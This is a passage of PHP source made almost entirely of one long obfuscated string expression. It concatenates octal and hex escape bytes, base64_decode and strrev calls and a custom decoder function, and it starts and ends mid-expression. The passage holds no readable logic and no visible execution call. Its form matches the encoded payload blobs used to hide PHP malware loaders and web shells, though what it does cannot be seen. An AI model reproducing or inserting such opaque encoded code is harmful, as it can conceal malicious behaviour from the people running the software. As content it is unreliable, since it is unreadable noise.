107\232\232\232\250\350\115\360\214\321\302\340\330\60\251\6\21\307\363\311\324\240\146\220\55\322\354\231\163\110\65\32\110\107\314\254\237\103\273\206\166\326\34\222\163\366\34\162\31\66\70\132\110\144\24\162"."\x5a\x97\x94\x73\x5\x23\x4e\x36\x2\xf5\xd\xa4\x35\xf9\x54\x71\x2c\x99\x90\x69\xd3\x48\x9\x43\xb9\x78\x61\x78\x94\x1c\x57\x69\xe6\xa8\xa1\x8f\xd0\xd3\xbd\xd5\x23\x71\xb6\xc3\xaa\xaf\x25\x95\x19\x1a\x56\xe5\xd5\xa3\xe4\x43\x8d\x8d".base64_decode('pOyZTaSKw2a6MJIkPdVYS6BKZqgwliVDOaeefHpmA6n8cH5k1eoE2XLVN5LkweyIOVQkw1vXRJreMA==')."\x87\xd0\x89\xbe\x3a\x67\xac\x1a\x26\x5b\xb9\x44\x5a\x1e\x4e\xc6\xa9\x2\x72\x66\x38\x95\x1b\x21\x91\x42\x51\xce\xea\x26\xd5\xa3\x8f\xeb\xc9\x7c\x82\x8c\x4d\x43\x13\xf9\x7c\xe3\x6c\xda\xad\x8d\xb4\xa3\x67\x93\xd6\x36\xd0\xca\xac\x56"."\222\5\163\220\364\14\313\70\223\320\107\143\23\331\121\325\323\361\150\152\40\105\315\152\42\135\144\230\143\132\152\224\356\173\345\334\130\234\36\101\200\261\317\344\351\221\354\220\232\63\263\161\62\36\115\63\11\371".base64_decode('NM6qo5+m/dBIAoXRzNAqetRKSWY2JeGGRkp/JKV+JimpkeI2NdZSOqPtaiCQukb62SYCKawazml0+A==')."\353\50\251\326\323\106\306\23\43\332\340\52\102\335\143\162\41\227\217\223\211\62\270\132\317\245\22\344\202\126\31\311\257\226\207\110\51\115\224\24\345\144\132\123\213\161\2\255\245\75\237\227\263\240\347\110\157\322".base64_decode('SiuDmdFUkjCRfFyVE7lh2nRSqXhmVTFL+UzjbNKTwyOGqVECncP6t5Y0dFYt6TBVMUHdMxRKmj+b0g==').base64_decode('+SolNZwYJLeudbMINKOOpU16K5pOJRMjdGDyOTluUsqrbyBfyw+OKXFqfpBZnc+aKZJ5Nh2CJkpjoA==')."\17\322\211\74\271\123\37\135\45\153\271\325\224\17\26\207\364\21\172\262\70\153\26\343\70\44\343\360\150\116\136\25\47\234\61\136\314\26\22\203\204\274\352\147\315\244\303\113\2\362\252\374\330\60\275\153\31\63"."\126\145\363\62\351\202\145\71\62\220\255\162\142\220\236\62\33\246\154\26\15\33\2\125\350\117\210\12\237\203\212\102\325\15\311\0\233\374\302\330\50\42\55\144\232\316\17\61\340\71\224\160\261\14\243\141\21\67".base64_decode('kTeFZBCzpMLjenjWgmNhU9PZ9TrWgnHBWrmsjaCEQDCScUs6g9JTGXtKyg6Po+5iOgbwP9IYbAZiKA==')."\x43\x45\x85\x69\x33\x63\x6c\x17\xed\xa3\xb8\xd0\xd7\xf8\xd0\xdc\x94\x8d\x41\x97\x8\x76\x8a\xa9\x2a\x58\x1d\xe5\x6c\xd6\x65\x35\xf\x82\xb6\x22\x74\x68\x62\x5c\x77\x94\xb7\x90\xdf\x6d\xa\x30\xde\xaf\x42\x57\x58\x7\x4a\xd0\x21\x2b".strrev('Úò'."\n".'’xŸ™ìÒ“b†6Ñ<¸iŠv…£um†êÚEj¹u`ÁUšñv-m„*0cr§Â%³M5$')."\x91\xb\x85\x92\x8e\x44\x43\x6f\xa5\x48\xb\x51\x58\x69\x99\x5c\xc8\x21\xc3\x1e\x87\x84\x3f\xe8\x90\xd0\x4d\x9f\x64\x35\x3a\xf1\x7b\x25\x76\x25\x2a\x8e\xbc\x58\x49\x5d\x29\x64\xe5\x4\xab\x60\x61\x4c\x4a\xc9\x20\x6b\xb2\x59\x4a\x81"."\11\40\121\225\147\311\324\150\130\254\232\170\345\150\153\214\145\102\331\233\143\111\4\75\136\144\206\34\354\242\303\162\351\246\265\145\145\303\340\252\234\350\52\226\67\2\107\331\315\112\30\24\315\256\220\165\45\251"."\122\315\71\45\207\60\251\266\52\272\71\141\52\173\211\254\42\353\226\133\233\171\13\12\231\2\64\345\63\347\56\40\206\105\344\72\52\46\174\227\204\271\132\264\10\315\332\157\202\350\4\163\171\133\5\233\73\210"."\46\344\300\232\100\163\41\33\152\341\120\34\52\346\141\70\124\314\303\324\146\41\173\212\174\336\305\161\345\31\74\135\111\116\45\115\20\76\66\102\20\150\336\156\153\17\201\46\71\131\247\201\216\0\134\71\151\40"."\375\44\62\117\110\221\206\140\151\24\342\375\15\263\243\356\377\216\254\246\330\71\5\300\371\363\114\335\310\310\312\364\356\311\0\313\201\232\127\330\110\25\15\166\114\337\352\11\373\333\142\101\17\125\263\225\13\5".base64_decode('N1Rgg3rAfEwg5fHJEZNTxPbCT6gEqv/FElnNEKZPLK2YMbIW0WUjo4C+k4F0awpUFEuqpDJd/taY1w==').base64_decode('HxLKKBRLyhDMQT1BfywcDgjVbxY4HNTL53ejMMb18+EVhHhvahgjGt1aQHM9qGoZloi5EKC1tk5PiA==').base64_decode('qVPOdNW66jgu+GAMapW2UPOicMQTKmO6iU06yTATM06SoTPQJ7UFunq7e8LYVhHDewJCOlKasySLYA==')."\122\254\57\330\345\151\363\111\376\236\110\200\152\303\62\245\140\244\7\35\146\161\332\164\335\120\230\251\46\311\217\43\242\256\266\130\42\53\211\114\210\176\107\145\264\42\132\23\255\212\126\257\164\105\215\1\62\311".strrev('çi>/;AA3ôã°Üß®Ãs¾ßÜë°8üÚ	(PÖ‹­§'."\0".'–&/Õ¢Ø…™¨´— ŸÖB#ŠW')."\267\276\175\373\231\357\234\274\155\307\15\277\334\165\317\206\235\347\156\331\371\313\23\111\325\337\331\162\333\333\333\356\335\165\356\265\73\156\270\160\347\371\167\354\272\230\334\312\274\373\273\33\167\254\277\226\125\114"."\172\367\234\173\166\156\270\172\347\171\133\167\236\171\303\216\73\317\331\161\367\111\73\156\277\335\1\162\277\173\312\231\273\266\335\260\363\264\363\167\376\366\204\235\267\234\261\363\222\63\167\254\337\270\343\242\153\167".strrev('§®Ï›OMm¡…Å	ÕKğZ½AVüµ{˜Ôl÷'."\n".'¦£Qîß— QÓ÷ÓµMç-ó;¬w“Êã²Øm')."\56\106\211\211\153\15\46\12\110\323\114\254\61\210\211\54\215\307\220\351\102\345\204\265\30\47\103\57\124\112\250\214\327\27\156\13\371\133\175\104\163\223\15\324\164\244\101\110\356\324\1\64\34\132\302\302\314\230"."\243\304\60\131\252\242\206\311\325\222\245\41\262\53\241\145\213\271\74\252\254\124\1\225\127\52\34\220\345\43\201\107\252\200\113\26\0\50\11\60\333\252\240\175\43\122\212\253\134\126\351\250\165\324\125\113\304\152"."\31\347\40\126\312\122\5\261\120\146\371\54\37\161\304\55\261\72\107\155\265\124\121\30\254\40\365\342\375\12\152\37\303\230\206\44\73\252\110\205\305\352\162\134\300\242\14\123\227\125\300\263\244\204\203\201\130\176"."\xf0\x6b\xb1\x3c\x4e\xb8\x78\xe\x3c\x4e\x0\xc3\xe\x93\x3c\x3d\x5e\x2b\x26\x36\x58\xe\x56\x4a\x72\x3e\x9\x52\x70\xff\x8a\xc3\x5c\x59\x2d\xc5\x89\x6e\x6c\x99\x44\x94\xcd\xd2\x19\x2d\x96\xce\xa8\x9a\x41\x58\x44\xb0\x83\x8d\x37\x56"."\147\225\260\55\4\256\226\154\320\201\42\120\64\124\20\212\107\213\342\152\240\31\140\160\60\76\10\260\224\101\145\214\227\4\70\21\113\240\43\10\341\154\20\313\244\41\113\362\12\54\160\341\166\346\214\64\345\162"."\xc4\x94\xb9\x7b\x19\x6b\x3\xa5\x65\x32\x4\xa\xb7\x43\x87\x56\x1d\xbe\x48\x5b\x27\xa6\xf2\xb0\x40\xe6\xc9\xf8\x74\xb\xa1\xf2\xee\x94\x2c\x24\x92\xa5\x26\x87\x4\xf\x4f\x17\xc8\x10\xf6\x41\x78\xfe\x9e\xf6\x40\xa8\x1b\x5b\x33\x84"._kodDe('KS/Q0nIME9TWB40zJWEJC5kHnjNnnwFpqe804gX9px/vTI1IJkEmANEpegGecg6O/r6gQB0aQPirOho=').base64_decode('MrcJgVAkBjqAsGeB61YKC4WoGFrU9WEmVMsJsMujZs9x6l0BFA7LbAv0tPup4YY3bknzhvzQ9pB8Vg==')."\242\45\304\270\216\0\210\24\106\222\54\314\255\355\140\2\133\320\101\204\257\347\60\105\160\362\0\77\23\356\141\141\56\67\202\10\124\275\343\274\265\317\313\302\235\314\346\12\46\4\102\102\304\23\362\164\207\131"."\x34\xd4\x7\x78\x35\x84\x9\xb6\x45\xdd\x9e\x70\x4\xb4\xaa\xa7\xb7\x9b\xf3\xf3\x2e\xcf\x12\x40\xa\x1\xda\x9b\x54\x7c\x77\xaf\xa8\x72\xd5\x2c\xa8\x8e\x62\xcb\x9\x1c\xc4\x3f\xb\x69\xc\x6a\x9f\xf\xac\xa9\x73\x48\x4d\x6b\xab\x9".base64_decode('DrU1iJkZNU/FUfiVxV2xrkAHjiPnE758kov2Ur8ERN8IF30NujAxWpcAhUrYHEvqCfR5uCcDIQFDiA==').base64_decode('cC1x/wbuFf3RkagLCAPGSm4Q4W2VqJjRBiVAoqlPcnvoWkkXBQcJxLJamtorA+Y3TkQD/LuUBhBfJA==').strrev('	éf¶È~G™PÏI›AÒ“öYM%‹aÃOX)o˜³^¢Q”'."\n".'1°ºu#2Ø¥±À')."\22\235\337\302\206\326\267\170\274\7\374\165\104\306\175\340\257\13\374\164\105\300\340\251\14\1\114\277\56\377\42\337\70\374\207\47\124\113\42\202\277\147\34\374\13\230\307\270\277\307\236\271\325\27\351\363\371\60".base64_decode('Ag2TX44KmAlpmuCa5LgANZySunztEQnG6WdjsSrUec6BGdWxmNvoJdTCDE+rKo+pqyTrgyfcNs44qw==')."\205\16\112\111\0\251\35\133\307\237\271\332\40\361\216\120\240\67\50\304\73\75\113\374\75\35\64\346\256\241\241\32\352\31\300\353\17\203\56\152\243\64\310\75\200\210\161\34\306\42\217\50\314\132\10\332\13\270".base64_decode('NogIIjaU7THXtc6x1l5/l1c0FoSIODQdcWyyXkynlaNxZDZII7DLaRiRF42gPqAR3AE0hrqLRpCnEQ==').strrev('c\'ÇÇ@è^‡lËNÌ˜ƒ)šRì.Àd+}‚ã&æ`ŒÌ<ŒÕusL3º@‰°4ĞõğÙ¸¥'."\r".'A')."\355\64\111\260\277\203\247\147\302\31\214\33\143\0\31\23\341\200\337\350\312\5\110\6\136\111\111\26\333\174\231\21\325\314\132\76\112\34\170\200\217\372\221\311\215\360\131\262\212\363\103\33\254\42\32\323\4\215"."\370\60\2\221\203\74\176\40\142\335\23\61\16\264\222\155\165\210\35\255\203\374\352\274\131\126\35\77\10\41\164\60\5\377\104\11\156\224\324\240\2\377\124\72\350\2\34\343\126\230\246\136\24\24\112\221\376\34"."\x18\x10\xf\x37\xb0\x62\xfa\x9f\x28\xad\x18\x87\xc8\x62\xc7\xa3\x3\x28\x30\x18\xd4\x16\xa\x49\x3\xa4\xea\xa6\x26\x71\x2c\xab\xda\x2a\x35\xc2\xc4\x8e\x5b\xec\x8a\x6f\x22\x98\xeb\xce\xb1\xf3\x5d\xaa\xb2\xa7\x82\x8e\xb5\x64\xe8\x15"."\xec\xa0\xe4\xa4\xa0\x28\xc7\xea\x81\xce\xf3\xf2\x56\x5f\x24\x60\xe0\xb3\x31\x68\xb0\x8\xa4\x99\x98\xc2\xdb\x96\x53\xc\x83\x1d\x23\xa3\xd5\x9d\x6\xcd\xc\xb7\x16\x13\x5d\xae\x78\x5b\x69\x3f\x16\xf3\x66\x58\xc9\x92\xab\xc\x6f\x1c"."\151\35\162\335\163\326\251\206\240\215\210\216\317\170\57\141\377\66\266\214\244\44\77\153\270\200\305\201\135\334\271\12\74\271\342\145\256\126\351\361\64\253\101\136\13\52\172\116\105\347\157\175\134\213\230\245\13\375"."\201\124\265\331\211\177\271\236\54\346\301\27\202\154\30\235\165\24\231\72\302\102\224\43\61\241\213\251\306\202\361\103\171\5\155\116\304\10\110\261\172\26\223\327\124\133\345\114\115\353\226\363\143\21\155\211\252\20".base64_decode('evUG+nq6AtQhBPUeg2NpcusLNi66i0ZMGtBl8uU+ukohuubOwaaKA45GjhOgJ9TWCcTKWLsfSNO+pQ==').strrev('…a²ó\'p†[v®¾ÖÊ'."\0".'P±ßâ8BT&`²"âÀ‡bYîÚ'."\r".'çc-µòydq€ß=ŞÂÆğ[tD')."\305\272\374\75\213\312\46\104\2\261\156\41\13\6\202\35\166\267\35\146\55\41\354\203\135\301\343\255\135\201\66\41\331\37\50\355\11\260\150\330\200\130\104\307\100\40\164\104\327\40\116\335\14\30\166\162\34\56"."\363\316\30\220\22\26\104\327\126\127\105\335\13\134\65\114\66\305\103\43\230\23\224\7\253\106\304\302\366\334\56\27\51\200\5\200\144\314\154\226\51\265\21\67\106\141\154\351\151\371\2\221\54\326\12\136\73\240"."\51\213\313\356\345\303\217\117\16\143\341\145\141\326\223\170\315\50\227\156\241\35\214\46\36\262\333\220\301\137\120\104\215\50\271\102\131\104\13\361\131\14\56\104\220\113\325\170\17\341\105\114\64\364\302\110\34\143"."\215\252\65\323\71\227\50\102\163\123\336\337\174\276\2\20\261\11\340\167\126\6\337\104\221\331\352\24\135\102\301\136\27\171\154\62\156\233\172\4\220\145\114\122\230\240\34\130\117\157\373\226\71\163\316\144\64\322".base64_decode('AZ1iRJezCqq64JUioeWTqmD0IycoOy0mBql5AlqvDOeISrvgGGbNSm6aYjKyxY6Jl4RDTkNN551yNg==').strrev('$jY¹UFë	ô›…ì§Ø¤LX1#™ÅO"éÂƒ#'."\r".'!	ğN~ßS:Ø'."\n".'MçIh<¨QÉ›n­')."\x3e\x97\xda\xc1\x8a\x26\xe8\xb0\x53\x2f\x3a\xdc\xd8\xb\xb2\x49\xe4\x66\x8\x47\x1d\x12\xf7\xd1\x46\x25\x71\xb\xf\xe7\x27\xfa\xe3\x64\xe9\xe0\x63\x85\xd3\x6c\xb4\x3\xa5\x43\x41\x79\x9f\x32\x92\xdc\x20\xc7\xcd\xd\xb2\x73\x7d\x2a".base64_decode('PtAmDivtwiUe37cTN2sgrXWM3osRVfvWMWgMULIgQhMt0fecpy/c6Ozs9rQ5ATusp1oGy3KAxjpVRg==')."\x61\xf2\x88\xd1\x48\x65\xc\xc\x99\xd1\x24\x65\xc0\x90\x10\xd2\x29\x75\x29\x73\x8c\xd5\xff\x11\x6\x62\x8f\x27\x40\x96\x4d\xc2\xfb\x15\x3a\x58\x18\x6a\x23\x29\xc\xe4\xf2\x10\x8e\x63\x4b\x7a\x7a\x8f\x97\x91\x59\x85\x61\x33\x70\xa8"."\334\167\227\226\375\356\322\162\337\135\152\373\356\322\322\357\142\220\215\164\345\102\241\15\373\133\33\27\30\214\5\224\20\43\224\123\247\340\75\220\170\13\105\244\166\254\3\340\2\311\136\325\200\62\177\222\341\33"."\74\304\246\107\112\230\70\226\342\376\243\363\41\42\314\270\134\254\40\50\211\41\366\217\41\131\331\60\241\200\302\17\105\240\111\150\67\23\212\164\112\321\156\315\60\312\134\205\5\302\364\274\302\332\64\174\57\45"."\x8\xe3\xc4\x7f\x13\x73\xc5\xc3\x1c\xf5\x70\x6f\x3e\x78\xbf\x89\xc3\x3e\x66\xf3\xd9\x2d\x8f\x7a\xd2\x4a\x58\x81\x7c\x8f\x74\x8e\x6f\xb4\xa0\x19\x8a\xe8\x3\x2a\xa9\x20\xdf\x22\xcc\x0\x48\x1e\x85\xdc\x88\xde\xd4\xca\xfa\x20\x4d\x19"."\x75\x82\x76\xd8\x9c\x11\x19\x8a\x32\x48\x65\x47\x41\xd0\x67\xc2\x7d\x90\x39\x19\xb2\xd7\xd\xf6\x9e\x33\x67\x71\xf9\x46\xfd\x1f\x89\xde\x22\x54\x8b\x85\x2d\x67\x91\x3a\x77\x37\x85\xe\x21\x9d\x65\x1\x4e\xc1\x80\xe\xb3\x4\xc1\x11"."\31\150\10\251\13\154\27\231\304\31\324\63\164\7\201\177\226\227\253\236\123\347\216\243\300\110\142\57\174\213\224\61\352\202\311\66\15\154\136\233\242\35\321\356\150\104\354\127\123\227\123\51\120\155\301\321\213\245".base64_decode('Lt/lV4pstI8t60mKJCJ/Zm4dXb46RmKMNpHbzzLUuRjCpVIqgAs0nWj8IrdQFNzS4k1EEHn+orxB2A==')."\x6f\x20\x8f\x5b\xc4\xad\x1e\x73\x81\x5\x7a\x2a\xdf\xaa\x25\xc9\x82\xb8\xa6\x2\x90\x60\x45\x73\xc5\x31\x55\xe0\xb7\xba\xc2\x51\x1\x5\x2e\x14\x87\x83\x6\x1\xe8\xdb\x15\xcd\xc7\x54\xa1\x40\x35\x31\x29\x5d\x4d\x54\xae\x4\x17\x36"."\xfc\x94\x97\xec\x24\x16\xc8\xa6\x29\x9c\x4e\x2c\x40\x1d\x3\xe7\x71\xbd\xbb\xde\x3d\x42\x58\xc5\x82\x21\xf8\x45\xee\x27\xd3\xce\xf7\x47\x63\x80\xd5\xd1\xfb\xe4\x98\xc8\x70\x9\x2b\x27\x3\x20\xa6\x74\xb2\x9a\x50\x56\xdc\xed\x25\xc5"."\57\165\172\272\227\73\271\123\251\171\13\106\163\131\211\70\201\152\251\254\163\325\126\112\324\161\152\113\145\157\244\335\71\273\162\301\374\311\363\332\320\61\245\251\164\303\163\106\350\320\13\173\21\235\117\16\27\346"."\301\351\307\42\156\153\154\242\274\70\135\316\311\253\265\74\130\336\0\73\312\271\22\244\63\173\31\313\342\176\300\362\212\71\242\351\344\50\226\260\306\172\252\203\227\21\30\115\316\40\323\15\133\276\66\303\63\12".base64_decode('2vzewlgx72wDq7sTCzTN1p4izgJrrfjQMawVX+SDkMPEbByGM5AcD2J/j82S6ARUcKzkhKIBnpd0hw==')."\113\140\220\153\122\220\52\272\251\242\124\277\320\126\137\330\325\116\40\203\101\372\7\363\13\54\271\246\122\16\305\352\126\322\356\154\322\336\13\50\13\34\134\247\350\305\162\24\210\333\60\71\257\214\232\116\70\276"."\x4e\xea\x1c\xa3\x34\x85\x4f\xe4\xb2\x55\x4d\x10\x52\x29\x87\xd2\x5b\x54\x93\xf6\x4f\xa2\x63\x6f\x67\xb1\x48\x3f\x58\xb6\x50\x71\x33\x40\x11\x50\x23\xfc\xac\x3c\x8b\x58\x2e\x83\xb1\x66\x92\xb8\x5d\xb2\x17\xce\x87\x4a\x9d\xd1\x81\xc9"."\53\325\67\64\317\234\323\114\265\135\217\245\247\366\305\202\331\302\202\324\131\335\124\167\212\362\1\356\203\222\266\15\216\256\305\103\237\0\346\335\310\146\70\145\40\26\74\136\133\213\7\123\322\120\274\17\25\374"."\x12\x96\x61\x98\x49\x85\x68\xa5\xaa\x79\xb2\x3c\xa\x72\x36\xeb\xf7\x34\xd\xe8\xc\x5f\xe6\x64\x1f\xcf\xe\xf2\xa\xc7\xa1\x32\x12\xa1\xda\x41\x50\x1f\x8d\x4b\x50\x68\x21\x15\xf8\x77\x22\x53\xcc\xf\xb6\x8\x89\x92\xa9\x69\x52\x4e".base64_decode('zo+RPcB0o3m6gZWmprsaUwaI4ASTOc+EKwp3DoJNkkkKPp1zQQenLrgshYoEK5gtMpeWBRQmNQx29Q==')."\166\370\173\204\173\66\1\20\153\363\366\304\74\301\140\331\4\322\341\140\117\244\46\334\360\154\332\265\212\372\163\116\120\342\231\247\346\322\122\2\152\275\265\124\100\150\205\144\350\11\352\266\250\302\115\330\45\102".base64_decode('4LumeSrJUgmzSClADU4UwsmV8+e51fmss7m1ta5xNT6XexrcG7nh3VX+WDi64nk6grZz22pJmidLuA==')."\37\133\52\341\105\103\252\122\312\200\25\230\135\322\317\267\147\356\241\107\301\363\334\262\230\10\47\120\110\53\331\247\15\263\243\270\262\147\214\236\204\315\301\145\233\234\137\122\232\5\26\356\112\224\113\162\243\215"."\275\133\160\214\112\116\42\104\205\52\213\173\23\353\151\53\73\263\54\103\40\56\346\16\272\40\47\6\41\165\161\366\216\21\135\44\41\10\167\42\70\301\342\202\321\24\156\17\100\23\300\107\341\116\124\347\356\142"."\327\254\301\5\301\105\176\355\332\122\30\121\73\260\47\171\12\252\35\4\251\310\16\203\233\156\16\3\353\224\365\63\230\202\105\44\16\241\70\135\75\35\74\3\336\142\360\70\110\354\247\32\75\50\26\355\257\164"."\xd5\xac\x5d\xeb\x56\xe9\x85\x5d\xb4\xc2\x9a\xd7\xc5\xb0\x71\x3c\xea\xb2\xe2\x83\x9a\x93\xae\x66\x88\x4\x60\xc7\xc4\xd2\xe2\x71\x64\xe2\x4d\x76\xd7\x70\x5d\x57\x76\x31\x27\xc1\xdb\xba\x96\x96\xf9\xfd\xec\xd4\x76\x80\xa6\x51\x39\x4f".strrev('®`Ş³fî5YÜo®€’_J”°SØqYŠ£¼Ì0Z¬ú±èR¤.+æ;±nâÔ.¶ÁcéÆu{‡M›­')."\327\263\245\50\210\347\330\340\360\206\315\226\0\125\51\21\170\30\60\105\40\144\255\262\303\101\131\14\310\2\363\214\204\256\26\114\13\277\302\157\23\124\40\177\266\253\344\141\31\243\124\110\324\45\172\5\362\316".base64_decode('VwH4E04hjIFXZR5kRJKuZFsqUHWNjKKA/IjVlPsIyFghUS6Zk1mP6aYG1jmmq0rcP/eGiF6ep2cZDg==')."\x10\x9\x6a\xda\xa\xfc\x7b\xcc\x34\x4a\x34\xc8\xdf\x78\x56\xd1\xb1\xf2\x11\xe2\x3e\xe8\x4c\x3f\xc5\x4f\xb4\x88\x37\xea\x60\x28\x10\x9\xb4\x51\xdf\xc0\xe5\x8e\xbe\x1a\xa9\xb8\x5a\xba\xd\x32\xb0\xa\x33\xdf\xdc\x50\x4d\xd1\x45\xbe"."\145\126\14\46\22\270\11\204\20\204\136\314\347\331\315\50\224\111\331\202\26\107\376\57\302\231\242\311\227\102\350\332\57\2\55\4\14\2\26\174\242\100\217\54\112\222\114\50\260\155\147\156\127\60\274\114\16\174"."\xbe\xb\xcb\xa3\x93\x45\xf0\x64\x4a\xbf\x94\xd5\xa8\x53\x98\xfa\xda\xda\x5a\x67\x6d\x1d\xf8\x3f\xbb\xc9\x21\x9f\x68\xa6\xe6\x33\x2\x4a\x6d\x6d\x33\xfa\x3f\x4e\x40\xe7\xaf\xa4\x8b\xad\x29\x60\x76\x53\x36\x44\x10\x46\x14\x85\x54\x88"."\x2c\x2\x39\x35\x5f\xa4\x22\x11\xe8\x2f\xe4\x8f\xa5\x99\xb2\x81\xb9\xc2\x6e\x6d\xae\xa4\xc0\xd6\x91\x98\x62\x6f\x69\x97\x96\xb6\xc\xa\x5d\x2a\xe0\x5c\xa7\x61\x20\x97\x80\xe1\x40\x2d\xa7\x3d\x69\x70\x96\xc0\x7\x1a\xd4\xc3\x97\x4f"."\x92\x7d\xc5\x5c\xac\x38\xdf\x22\x7e\xcc\x45\x7b\x50\x4\x8a\x67\xe9\x26\x4b\xb3\x7c\x1f\x40\xc1\xba\x99\x60\x55\x87\x0\xe1\x58\x2\xca\x4d\x82\x43\x1a\x18\x15\xef\x3f\x51\x32\xd3\xc7\x46\xb1\x2c\xb3\xcc\x81\xd1\x1e\x56\x52\x39\x12"."\xca\x68\x23\x31\xbe\xf8\xc1\xe8\x71\x2c\x86\xfa\x4\x6e\x4b\x28\xb1\xb0\xd6\x93\x8e\xa1\xac\x90\x12\x7\xbd\xe6\x23\xb7\x86\xc8\xb2\x65\x50\xcd\x5a\x4c\x27\x62\x42\xd9\xa2\x3f\x4b\xc0\x71\xa0\x54\x4b\x87\x15\x9f\xa5\x93\xf\x40\x81"."\310\305\173\17\271\73\103\17\53\140\335\200\346\311\102\117\352\32\67\140\50\171\57\204\306\302\345\357\240\205\23\53\12\233\0\223\35\150\121\210\217\2\360\375\156\33\163\15\43\24\140\117\262\345\361\44\205\367"."\x30\xc\xee\x13\xa6\x8d\xb9\x7f\x12\x1d\xc5\x60\x2f\x38\xc2\x45\xaa\x41\x7c\xc\x72\xc7\x50\xb4\xc\xd6\xfa\xa2\x9e\x75\x15\x74\x2d\xd\x46\xc2\x10\xea\x5\xe1\xc1\xf2\x60\x86\x5e\x8a\x59\x6\x89\x35\x48\xc4\x13\x81\x50\xf1\x82\x3e"."\xc5\x40\x88\x8a\x9d\xb7\x3\x36\xcb\xd8\xa2\x80\xca\xaf\xe\x4\xa0\x55\x35\x42\x48\x68\x63\x9e\x83\x45\x20\xdc\xa0\xf4\xa\xdb\x4b\x64\x32\x65\x2d\x3\xee\x7c\xac\x10\x56\xb3\xef\x20\x21\xba\x31\x35\xc9\x73\x1f\x82\xe5\xb\x41\xe3"."\232\40\360\204\100\74\372\124\265\66\102\73\260\67\370\55\236\25\136\102\145\144\206\264\120\341\37\115\41\153\332\233\353\316\246\201\163\50\26\154\74\73\237\22\17\124\341\244\351\144\57\112\224\241\16\53\5\224"."\xc\x35\x9a\x33\xb0\x80\x66\xc6\x25\x84\x18\xba\xed\x77\x21\xc7\x89\x5c\x92\xb6\x45\xed\x1a\x1\x88\xff\x99\x94\x85\x51\x67\x6f\x79\xe6\x6f\x19\x76\x6\xee\x7d\x1c\x2f\xf3\x5\x92\x89\x65\x71\xd1\x2b\x47\x57\x22\x95\xb6\x81\x18\xd1"."\x95\x0\x14\xbe\x7d\x40\x6a\xb8\x40\x58\xa5\x7c\xb3\x5b\x5b\xd\xf8\x9a\xec\x9e\xe9\xaa\x95\xaa\xfa\x54\x20\x85\x8d\x18\x52\x4f\x44\x6a\x72\xd5\xcf\x95\xfa\x2\x7d\x4d\x8d\xd5\x12\x90\x7\xb3\x4a\x9f\x12\x5f\xa4\x9a\xee\x99\xd\xb3".base64_decode('XA1NUtWizkh3l0OC1lRSB5AvtWqpLaNrOcVdPwvafjTObHDNaZTCckrWVZILf1GP498R8gtfDosJVQ==').strrev('SäTáRAŸG€×,†·Á+„BÅ¬•®!ğî%d¢M"2'."\n".'ƒ'."\r".'¨L½s×\'|^}aò@'."\0".'°Z5')."\56\31\2\251\301\50\43\54\250\213\236\145\176\264\373\243\306\100\115\324\335\255\44\125\271\125\33\305\321\176\364\203\264\130\241\112\140\65\214\316\370\137\242\65\321\1\246\364\70\75\350\155\167\362\144\42\255\21".strrev('½Sî"Z™!X–ƒ"ĞLY-tsôË‚ÁF‚<ì` Keàl›°mÃ€Œ¿qï±–-"^GÏE{qÉç').base64_decode('ZI4gaUx8SGkUCOisRXo0P4DmMYSidmBYjaVtGDZj+nRfoJ31GscYra8dsMYWVPXnUwMLqqtgxnECww==')."\245\320\356\245\357\153\131\252\42\176\325\322\275\63\264\370\52\267\112\366\211\156\102\40\250\156\363\346\125\271\152\252\347\317\347\333\110\67\244\62\113\11\254\316\320\323\145\151\331\226\110\210\42\353\314\53\246\33"."\x48\x1c\xfa\x58\xe1\xbf\xce\xa9\x60\x74\x92\x19\xde\x13\xfe\xb7\x39\xdd\x7e\x2f\xe9\xf0\xfe\x1\x1c\x98\x7\xfa\x64\xc5\xfc\x81\x9a\xea\xfe\xf9\x65\x20\x2c\x5f\x50\x57\x86\xcb\x36\x19\xf4\x1b\x1b\xef\x28\x79\xb4\x2b\x4a\xd6\xae\x28"."\175\54\214\250\52\106\211\256\42\125\53\144\152\206\264\51\125\321\150\64\211\374\225\63\105\163\2\141\56\356\253\246\201\170\275\210\201\1\24\141\32\305\233\327\57\73\123\250\256\363\1\62\323\77\236\347\252\231"."\177\14\315\214\56\77\50\201\114\231\114\255\300\72\153\330\327\107\333\175\340\217\21\345\261\244\170\164\57\102\220\1\333\165\372\172\42\376\210\337\107\24\354\367\330\147\362\176\123\110\37\20\145\326\51\223\151\221"."\240\163\243\243\265\265\340\157\16\370\223\301\137\2\374\45\41\11\107\15\360\357\154\360\7\122\32\0\264\101\211\216\316\214\203\77\220\72\13\374\316\202\130\51\360\67\223\163\221\371\363\171\301\240\265\36\147\73"."\150\166\271\302\101\226\371\214\302\205\12\302\175\176\174\25\145\214\364\70\2\76\7\241\310\164\16\311\131\246\152\43\274\125\6\77\31\325\341\274\203\263\216\117\217\52\150\367\211\360\340\154\55\123\23\216\313\60".base64_decode('LY2YiIZ7/zOWOI1Zs2Y4XbV19Q2NM5tmzSbH8vliTtHpIYsbealsgD9qkv7wjbn1kLpgUNcFOa7amQ==')."\44\63\100\31\25\224\226\14\121\315\153\120\31\353\246\147\22\160\55\4\373\361\34\175\207\143\166\153\220\120\216\73\332\17\271\115\224\122\42\364\212\53\50\362\220\130\70\103\17\124\247\327\326\47\233\331\77\66".base64_decode('GBlTOW24hLrit6HkImgTPbNcVUjzikWEZ6QAERht+IpVOBGHJQplCweWKA6f8KLCDQZk49TNhZgmgA==')."\27\272\200\100\224\162\371\226\372\333\135\155\360\41\254\160\201\31\250\33\241\216\126\34\142\1\124\171\27\334\326\345\225\54\275\41\326\201\320\20\142\153\34\150\222\143\125\101\111\73\12\371\264\43\255\246\34\361".base64_decode('XMFhqqkU/McBxtBRSCQdxnDaoaTkUceIEi9Ql996vUPRU47BZMKRTOiOJCggr4848krKoQG4PlLvKA==')."\x80\xb0\x1\x60\x32\xf8\x33\xf4\x7a\x9c\x71\x58\x4d\x2a\x1a\xd8\x3c\x19\x5a\xb6\x88\x94\xb6\x46\x27\x80\x93\x2d\x17\x87\x2c\xb5\xf4\x82\xbf\xdd\x5b\xeb\x5a\x1a\x62\xa9\xa3\x8e\x9\x12\xec\xc5\x2c\xfb\xce\x62\xc6\x2c\xc5\x2c\xb3\x17"."\43\46\172\251\257\366\205\170\110\150\34\277\364\45\147\241\357\167\362\337\150\256\340\202\177\110\214\120\40\242\3\215\371\102\350\126\102\120\242\160\121\104\164\3\65\306\205\21\115\127\201\350\53\227\257\110\300\236".base64_decode('aGgpc4RpcImoYZIi1I1UhKWQuFGKaWmFpkfYWzhx1QyCjbbM9S/xaAK4EStA01UhCQIBdlAdpVbrCw=='